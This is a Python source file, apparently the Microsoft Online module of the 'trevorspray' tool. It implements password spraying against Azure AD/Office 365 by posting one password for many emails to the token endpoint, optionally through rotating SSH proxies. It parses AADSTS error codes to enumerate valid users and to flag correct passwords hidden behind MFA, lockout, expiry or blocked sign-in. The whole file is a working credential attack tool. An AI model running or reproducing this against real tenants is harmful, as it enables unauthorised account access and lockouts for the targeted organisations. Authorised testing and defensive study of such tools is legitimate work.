import logging
import requests
from time import sleep
from .proxy import SSHProxyError


log = logging.getLogger('trevorspray.msol')


class MSOLSpray:

    def __init__(self, emails, password, url, skip_logins=None, load_balancer=None, force=False, verbose=False):

        self.emails = list(emails)
        self.password = password
        self.url = url
        self.valid_logins = []
        self.valid_emails = []
        self.tried_logins = []
        self.lockout_counter = 0
        self.lockout_question = False
        self.load_balancer = load_balancer
        self.force = force
        self.verbose = verbose

        if skip_logins is None:
            self.skip_logins = []
        else:
            self.skip_logins = skip_logins


    def spray(self):

        for i,email in enumerate(self.emails):

            login_combo = f'{self.url}:{email}:{self.password}'

            if login_combo in self.skip_logins:
                log.info(f'Already tried {login_combo}, skipping')
                continue

            body = {
                'resource': 'https://graph.windows.net',
                'client_id': '38aa3b87-a06d-4817-b275-7a316988d93b',
                'client_info': '1',
                'grant_type': 'password',
                'username': email,
                'password': self.password,
                'scope': 'openid',
            }

            headers = {
                'Accept': 'application/json',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Windows-AzureAD-Authentication-Provider/1.0',
            }

            proxy = None
            proxy_arg = dict()
            if self.load_balancer is not None:
                proxy = next(self.load_balancer)
                if proxy is not None:
                    proxy_arg = {
                        'http': str(proxy),
                        'https': str(proxy)
                    }

            while 1:
                url = f'{self.url}'
                try:
                    if self.verbose:
                        log.debug(f'Requesting {url} through proxy: {proxy}')
                    r = requests.post(
                        url,
                        headers=headers,
                        data=body,
                        proxies=proxy_arg,
                        timeout=10
                    )
                    if self.verbose:
                        log.debug(f'Finished requesting {url} through proxy: {proxy}')
                    break
                except requests.exceptions.RequestException as e:
                    log.error(f'Error in request: {e}')
                    log.error('Retrying...')
                    # rebuild proxy
                    if proxy_arg:
                        try:
                            proxy.start()
                        except SSHProxyError as e:
                            log.error(e)
                    sleep(1)

            if r.status_code == 200:
                log.critical(f'{email} : {self.password}')
                self.valid_logins.append(f'{email} : {self.password}')
                self.valid_emails.append(email)
            else:
                resp = r.json()
                error = resp['error_description']

                if 'AADSTS50126' in error:
                    log.warning(f'Invalid email or password. email: {email} could exist.')
                    self.valid_emails.append(email)

                elif 'AADSTS50128' in error or 'AADSTS50059' in error:
                    log.info(f'Tenant for account {email} doesn\'t exist. Check the domain to make sure they are using Azure/O365 services.')

                elif 'AADSTS50034' in error:
                    log.info(f'The user {email} doesn\'t exist.')

                elif 'AADSTS50079' in error or 'AADSTS50076' in error:
                    # Microsoft MFA response
                    log.critical(f'{email} : {self.password} - NOTE: The response indicates MFA (Microsoft) is in use.')
                    self.valid_logins.append(f'{email} : {self.password}')
                    self.valid_emails.append(email)

                elif 'AADSTS50158' in error:
                    # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
                    log.critical(f'{email} : {self.password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.')
                    self.valid_logins.append(f'{email} : {self.password}')
                    self.valid_emails.append(email)

                elif 'AADSTS50053' in error:
                    # Locked out account or Smart Lockout in place
                    log.error(f'The account {email} appears to be locked.')
                    self.valid_emails.append(email)
                    self.lockout_counter += 1

                elif 'AADSTS50057' in error:
                    # Disabled account
                    log.info(f'The account {email} appears to be disabled.')

                elif 'AADSTS50055' in error:
                    # User password is expired
                    log.critical(f'{email} : {self.password} - NOTE: The user\'s password is expired.')
                    self.valid_logins.append(f'{email} : {self.password}')
                    self.valid_emails.append(email)

                elif 'AADSTS50131' in error:
                    # Password is correct but login was blocked
                    log.critical(f'{email} : {self.password} - Correct password but login was blocked.')
                    log.error(error)
                    self.valid_logins.append(f'{email} : {self.password}')
                    self.valid_emails.append(email)

                else:
                    # Unknown errors
                    log.error(f'Got an error we haven\'t seen yet for user {email}')
                    log.error(error)

            # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
            if not self.force and self.lockout_counter == 10 and self.lockout_question == False:
                log.error('Multiple Account Lockouts Detected!')
                log.error('10 of the accounts you sprayed appear to be locked out. Do you want to continue this spray?')
                yes = {'yes', 'y'}
                no = {'no', 'n', ''}
                self.lockout_question = True
                choice = 'X'
                while(choice not in no and choice not in yes):
                    choice = input('[Y/N] (default is N): ').lower()

                if choice in no:
                    log.info('Cancelling the password spray.')
                    log.info('NOTE: If you are seeing multiple "account is locked" messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled.')
                    break

            self.tried_logins.append(login_combo)
            yield None